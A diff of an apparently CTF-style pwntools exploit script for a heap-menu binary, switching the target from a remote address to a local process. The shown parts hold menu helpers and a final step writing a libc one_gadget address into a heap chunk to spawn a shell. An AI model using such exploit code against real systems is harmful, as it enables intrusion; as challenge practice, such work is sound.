@@ -4,13 +4,12 @@ import os.path
 from pwn import *
 context(os='linux', arch='amd64', log_level='debug')
 
-p = remote('172.16.9.24', 9016)
-#p = process('source-bak')
+# p = remote('172.16.9.24', 9016)
+p = process('source')
 
 def cmd(idx):
     p.recvuntil('>')
     p.sendline(str(idx))
-
 
 def new(size, content):
     cmd(1)
@@ -24,19 +23,16 @@ def new(size, content):
     else:
         p.sendline(content)
 
-
 def delete(idx):
     cmd(2)
     p.recvuntil('index \n> ')
     p.sendline(str(idx))
-
 
 def show(idx):
     cmd(3)
     p.recvuntil('> ')
     p.sendline(str(idx))
     return p.recvline()[:-1]
-
 
 def main():
     # Your exploit script goes here
@@ -105,7 +101,6 @@ def main():
     one_gadget = libc.address + 0x4f322 
     #gdb.attach(p)
     new(0x10, p64(one_gadget))
-
 
     # system("/bin/sh\x00")
     #delete(1)
